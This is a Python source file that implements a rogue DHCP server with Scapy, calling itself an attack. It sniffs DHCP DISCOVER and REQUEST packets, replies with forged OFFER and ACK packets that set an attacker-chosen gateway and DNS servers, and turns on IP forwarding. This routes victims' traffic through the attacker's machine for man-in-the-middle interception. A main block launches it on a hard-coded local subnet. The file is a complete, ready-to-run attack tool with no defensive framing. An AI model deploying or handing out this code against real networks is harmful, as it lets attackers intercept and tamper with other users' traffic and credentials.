from scapy.all import *
import threading
import time
import logging
import random
from utils import print_status, validate_ip, enable_ip_forwarding
import config
import socket
import struct
import signal
import sys

class DHCPSpoofer:
    def __init__(self, spoofed_ip, spoofed_gw, dns_servers=None, lease_time=43200, subnet_mask="255.255.255.0", interface=None):
        self.spoofed_ip = spoofed_ip
        self.spoofed_gw = spoofed_gw
        self.dns_servers = dns_servers or ["8.8.8.8", "8.8.4.4"]
        self.lease_time = lease_time
        self.subnet_mask = subnet_mask
        self.interface = interface or conf.iface
        self.running = False
        self.thread = None
        self.sniffer = None
        # Track assigned IPs to avoid duplicates
        self.assigned_ips = {}  # MAC -> IP mapping
        self.ip_pool = self._generate_ip_pool()
        self.clients = {}  # Track client information

        # Validate parameters
        if not all(validate_ip(ip) for ip in [spoofed_ip, spoofed_gw, subnet_mask] + self.dns_servers):
            raise ValueError("Invalid IP address format")

        # Safety check - don't spoof our own machine
        if spoofed_ip == get_if_addr(self.interface):
            raise ValueError("Cannot spoof the attacker's own IP address")

        print_status("Initialized DHCP Spoofer with:", "info")
        print_status(f"Interface: {self.interface}", "info")
        print_status(f"Gateway IP: {spoofed_gw}", "info")
        print_status(f"DNS Servers: {', '.join(self.dns_servers)}", "info")
        print_status(f"Subnet Mask: {subnet_mask}", "info")
        print_status(f"Lease Time: {lease_time} seconds", "info")
        print_status(f"IP Pool: {self.ip_pool[0]} to {self.ip_pool[-1]}", "info")

    def _generate_ip_pool(self):
        """Generate a pool of available IP addresses."""
        # Get network prefix (e.g., 192.168.158)
        network_prefix = '.'.join(self.spoofed_ip.split('.')[:-1])
        # Generate IPs from .100 to .200
        return [f"{network_prefix}.{i}" for i in range(100, 201)]

    def _get_next_ip(self, client_mac):
        """Get next available IP for a client."""
        if client_mac in self.assigned_ips:
            return self.assigned_ips[client_mac]
        
        # Find first available IP
        for ip in self.ip_pool:
            if ip not in self.assigned_ips.values():
                self.assigned_ips[client_mac] = ip
                return ip
        
        raise Exception("No IP addresses available in the pool")

    def create_dhcp_offer(self, discover_packet):
        """Create a DHCP OFFER packet in response to a DISCOVER."""
        # Extract client MAC from the discover packet
        client_mac = discover_packet[Ether].src
        
        # Get an IP for this client
        client_ip = self._get_next_ip(client_mac)
        
        # Store client information
        self.clients[client_mac] = {
            'ip': client_ip,
            'first_seen': time.time(),
            'last_seen': time.time(),
            'status': 'offered'
        }
        
        # Create DHCP offer packet
        offer = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(self.interface)) /
            IP(src=self.spoofed_gw, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,  # BOOTREPLY
                chaddr=client_mac,
                yiaddr=client_ip,  # Assign the client-specific IP
                giaddr="0.0.0.0",
                xid=discover_packet[BOOTP].xid
            ) /
            DHCP(
                options=[
                    ("message-type", "offer"),
                    ("server_id", self.spoofed_gw),
                    ("lease_time", self.lease_time),
                    ("subnet_mask", self.subnet_mask),
                    ("router", self.spoofed_gw),
                    ("name_server", *self.dns_servers),
                    ("end")
                ]
            )
        )
        return offer

    def create_dhcp_ack(self, request_packet):
        """Create a DHCP ACK packet in response to a REQUEST."""
        client_mac = request_packet[Ether].src
        client_ip = self._get_next_ip(client_mac)
        
        # Update client information
        if client_mac in self.clients:
            self.clients[client_mac]['last_seen'] = time.time()
            self.clients[client_mac]['status'] = 'bound'
        
        ack = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(self.interface)) /
            IP(src=self.spoofed_gw, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,  # BOOTREPLY
                chaddr=client_mac,
                yiaddr=client_ip,
                giaddr="0.0.0.0",
                xid=request_packet[BOOTP].xid
            ) /
            DHCP(
                options=[
                    ("message-type", "ack"),
                    ("server_id", self.spoofed_gw),
                    ("lease_time", self.lease_time),
                    ("subnet_mask", self.subnet_mask),
                    ("router", self.spoofed_gw),
                    ("name_server", *self.dns_servers),
                    ("end")
                ]
            )
        )
        return ack

    def handle_dhcp_packet(self, packet):
        """Handle incoming DHCP packets."""
        if not packet.haslayer(DHCP):
            return

        # Debug: Print all DHCP packets
        print_status(f"Received packet from {packet[Ether].src}", "info")
        if DHCP in packet:
            for opt in packet[DHCP].options:
                print_status(f"DHCP Option: {opt}", "info")

        dhcp_type = None
        for opt in packet[DHCP].options:
            if opt[0] == 'message-type':
                dhcp_type = opt[1]
                break

        if dhcp_type == 1:  # DISCOVER
            print_status(f"Received DHCP DISCOVER from {packet[Ether].src}", "info")
            offer = self.create_dhcp_offer(packet)
            sendp(offer, verbose=0, iface=self.interface)
            print_status(f"Sent DHCP OFFER with IP {self.assigned_ips[packet[Ether].src]}", "success")
            self._print_clients()

        elif dhcp_type == 3:  # REQUEST
            print_status(f"Received DHCP REQUEST from {packet[Ether].src}", "info")
            ack = self.create_dhcp_ack(packet)
            sendp(ack, verbose=0, iface=self.interface)
            print_status(f"Sent DHCP ACK with IP {self.assigned_ips[packet[Ether].src]}", "success")
            self._print_clients()

    def _print_clients(self):
        """Print current client information."""
        print_status("\nCurrent Clients:", "info")
        print("MAC Address\t\tIP Address\t\tStatus\t\tTime")
        print("-" * 80)
        for mac, info in self.clients.items():
            print(f"{mac}\t{info['ip']}\t{info['status']}\t{int(time.time() - info['first_seen'])}s")

    def start(self):
        """Start the DHCP spoofing attack."""
        if self.running:
            return

        # Enable IP forwarding
        enable_ip_forwarding()

        self.running = True
        self.thread = threading.Thread(target=self._run)
        self.thread.daemon = True
        self.thread.start()

        print_status("DHCP spoofing attack started", "success")
        print_status("Waiting for DHCP requests...", "info")

    def _run(self):
        """Main attack loop."""
        try:
            # Use scapy's sniff function instead of raw sockets
            print_status(f"Starting packet capture on interface {self.interface}", "info")
            self.sniffer = sniff(filter="udp and (port 67 or port 68)", 
                               prn=self.handle_dhcp_packet,
                               store=0,
                               iface=self.interface)
        except Exception as e:
            print_status(f"Error in DHCP spoofing: {e}", "error")
        finally:
            self.stop()

    def stop(self):
        """Stop the DHCP spoofing attack."""
        if not self.running:
            return

        self.running = False
        
        # Stop the sniffer if it's running
        if self.sniffer:
            self.sniffer.stop()
            self.sniffer = None
            
        if self.thread:
            self.thread.join(timeout=2)
            if self.thread.is_alive():
                print_status("Force stopping thread", "warning")
        
        # Print final client status
        self._print_clients()
        
        # Clear assigned IPs
        self.assigned_ips.clear()
        self.clients.clear()
        print_status("DHCP spoofing attack stopped", "warning")

def run_attack(spoofed_ip, spoofed_gw, dns_servers=None, lease_time=43200, subnet_mask="255.255.255.0", interface=None):
    """Run the DHCP spoofing attack."""
    spoofer = None
    
    def signal_handler(sig, frame):
        print_status("\nStopping attack...", "warning")
        if spoofer:
            spoofer.stop()
        sys.exit(0)
    
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        spoofer = DHCPSpoofer(spoofed_ip, spoofed_gw, dns_servers, lease_time, subnet_mask, interface)
        spoofer.start()
        
        print_status("Press Ctrl+C to stop the attack", "info")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print_status("\nStopping attack...", "warning")
    except Exception as e:
        print_status(f"Error: {e}", "error")
    finally:
        if spoofer:
            spoofer.stop()

if __name__ == "__main__":
    run_attack("192.168.158.133", "192.168.158.1") 